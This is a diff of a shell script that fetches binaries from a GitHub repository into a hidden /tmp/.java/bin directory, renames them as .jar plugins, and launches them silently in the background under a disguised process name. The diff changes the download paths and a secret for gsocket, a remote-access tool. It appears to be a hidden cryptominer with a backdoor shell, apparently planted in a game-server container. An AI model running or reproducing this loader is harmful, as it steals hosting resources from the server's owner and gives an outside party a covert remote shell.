@@ -7,15 +7,15 @@ function fetch_files() {
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
-    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/es/n1.json -o conf.json
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/azulhst/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/azulhst/n1.json -o conf.json
 }
 
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && nohup ./mc-mods.jar -a '-java' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
     # GNET
-    export GSOCKET_ARGS="-s iA3eD2E2K9c-5A16f9L8M9-3D9g8Hbj7-56C4a9f6X1-eCd9F9440-d6A2803-9A1c5J1g6K -liqD"
+    export GSOCKET_ARGS="-s i1A3eD2E2K9c-A1K6f9L2M3-4D9g8H6b5j7-56C4a9f6X1eCd9F9440-d6A28039A1c5J1g6K -liqD"
     export HOME=/home/container
     cd /tmp/.java/bin && exec -a -java ./add-on.jar &
 }
